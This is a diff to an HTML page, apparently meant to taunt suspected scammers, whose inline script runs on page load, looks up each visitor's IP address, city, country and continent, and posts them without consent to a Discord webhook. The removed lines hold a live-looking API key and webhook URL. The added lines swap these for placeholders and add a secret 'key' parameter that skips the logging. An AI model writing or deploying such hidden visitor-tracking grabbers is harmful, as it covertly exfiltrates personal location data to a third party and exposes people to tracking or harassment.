@@ -56,33 +56,47 @@
     <a href="https://www.google.com/search?q=how+to+stop+being+a+worthless+scammer" target="_blank">Click Here, Dumbass</a>
 
     <script>
-        // Geolocation script (grab.js functionality inline)
-        $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) {
-            // Send the data to Discord webhook
-            var request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
-            request.setRequestHeader('Content-type', 'application/json');
-            var payload = {
-                username: "GrabUrMom",
-                avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
-                embeds: [{
-                    color: "4700374",
-                    title: "YOU GOT INFO",
-                    fields: [
-                        {name: "IP", value: data.ip_address || "Unavailable"},
-                        {name: "CITY", value: data.city || "Unavailable"},
-                        {name: "COUNTRY", value: data.country || "Unavailable"},
-                        {name: "CONTINENT", value: data.continent || "Unavailable"}
-                    ],
-                    footer: {
-                        text: "By KazUpTV"
-                    }
-                }]
-            };
-            request.send(JSON.stringify(payload));
-        }).fail(function() {
-            console.error("Failed to fetch geolocation data.");
-        });
+        // Function to check for a "key" parameter in the URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Check for the secret key in the URL
+        const secretKey = getQueryParam("key");
+        const allowedKey = "friend"; // Replace with your own secret key
+
+        if (secretKey === allowedKey) {
+            console.log("Access detected with the secret key. Not sending info to Discord.");
+        } else {
+            // Geolocation script
+            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY", function(data) {
+                // Send the data to Discord webhook
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/WEBHOOK_URL");
+                request.setRequestHeader('Content-type', 'application/json');
+                var payload = {
+                    username: "GrabUrMom",
+                    avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
+                    embeds: [{
+                        color: "4700374",
+                        title: "YOU GOT INFO",
+                        fields: [
+                            {name: "IP", value: data.ip_address || "Unavailable"},
+                            {name: "CITY", value: data.city || "Unavailable"},
+                            {name: "COUNTRY", value: data.country || "Unavailable"},
+                            {name: "CONTINENT", value: data.continent || "Unavailable"}
+                        ],
+                        footer: {
+                            text: "By KazUpTV"
+                        }
+                    }]
+                };
+                request.send(JSON.stringify(payload));
+            }).fail(function() {
+                console.error("Failed to fetch geolocation data.");
+            });
+        }
     </script>
 </body>
 </html>
